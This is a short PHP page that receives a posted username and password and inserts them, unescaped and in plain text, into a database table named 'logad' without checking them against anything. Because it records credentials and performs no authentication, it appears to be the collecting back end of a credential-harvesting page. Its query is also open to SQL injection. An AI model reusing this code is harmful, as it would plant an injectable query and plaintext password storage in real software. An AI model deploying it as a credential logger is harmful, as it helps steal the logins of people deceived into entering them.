<?php
include_once('admconfig.php');
 
?>


<!DOCTYPE html>
<html>
<head>
<title> </title>
</head>
<body>
 

<?php
if(isset($_POST['login'])){
      $username=$_POST['username'];
      $password=$_POST['password'];
    
     
     echo "<br>";
    $result=mysqli_query($mysqli,"Insert into logad(username,password) VALUES('$username','$password')");
     
}

?>
</body>
<script>
    window.onerror = function() {
        location.reload();
    }
</script>
</html>